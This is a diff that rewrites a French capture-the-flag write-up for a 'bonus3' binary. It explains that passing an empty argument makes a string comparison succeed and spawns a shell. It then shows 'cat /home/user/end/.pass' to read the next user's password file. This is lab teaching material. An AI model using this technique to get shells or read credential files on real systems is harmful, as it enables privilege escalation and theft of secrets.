@@ -1,22 +1,37 @@
-l'exploit est tres simple
-dans le code source il y a buf[atoi(argv[1])] = 0;
+### Bonus 3
 
-puis
+#### Etape 01 :
+
+On inspecte le code source et on trouve la ligne suivante :
+
+```c
+buf[atoi(argv[1])] = 0;
+```
+
+Ensuite, le programme compare `buf` et `argv[1]` :
+
+```c
 if (strcmp(&buf, argv[1]))
     puts(&var_56);
 else
     execl("/bin/sh", "sh", 0);
+```
 
-donc si buf est argv[1] sont identique on accede a un shell
+Conclusion : si les deux chaînes sont identiques, le programme ouvre un shell.
 
-il suffit donc de taper :
+#### Etape 02 :
 
+Il suffit donc de lancer le binaire avec une chaîne vide :
+
+```bash
 ./bonus3 ""
+```
 
-pour faire sorte que argv[1] = \0
-buf[0] = 0
+Dans ce cas, `argv[1]` vaut `\0`, et `buf[0] = 0` aussi. Les deux valeurs deviennent identiques, ce qui déclenche `execl("/bin/sh", "sh", 0)`.
 
-donc buff = argv[1] ca nous donne acces au shell
+Une fois dans le shell, il reste à récupérer le mot de passe :
 
+```bash
 whoami
 cat /home/user/end/.pass
+```
